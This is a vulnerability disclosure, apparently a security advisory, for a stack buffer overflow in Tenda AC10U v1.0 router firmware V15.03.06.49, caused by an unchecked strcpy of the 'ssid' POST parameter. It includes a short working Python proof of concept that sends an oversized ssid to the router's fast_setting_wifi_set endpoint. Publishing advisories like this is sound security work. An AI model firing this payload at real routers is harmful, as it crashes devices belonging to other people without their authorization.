## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3795.html

## Affected version

AC10U v1.0 Firmware V15.03.06.49

## Vulnerability details

The Tenda AC10U v1.0 Firmware V15.03.06.49 firmware has a stack overflow vulnerability in the `form_fast_setting_wifi_set` function. The `ssid` variable receives the `ssid` parameter from a POST request and is later assigned to the `ssid_24g` and `ssid_5g` variable, which is fixed at 64 bytes. However, since the user can control the input of  `ssid`, the statement `strcpy(ssid_24g, ssid);`and `strcpy(ssid_5g, ssid);` can cause a buffer overflow. The user-provided  `ssid` can exceed the capacity of the `ssid_24g` and `ssid_5g` array, triggering this security vulnerability.

![image-20240313145111247](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313145111247.png)

![image-20240313145126123](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313145126123.png)

## POC

```python
import requests
ip = '192.168.84.101'
url = f'http://{ip}/goform/fast_setting_wifi_set'

payload = {
    'ssid': 'a' * 1000
}

r = requests.post(url=url, data=payload)
print(r.content)
```

![image-20240313145152680](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313145152680.png)
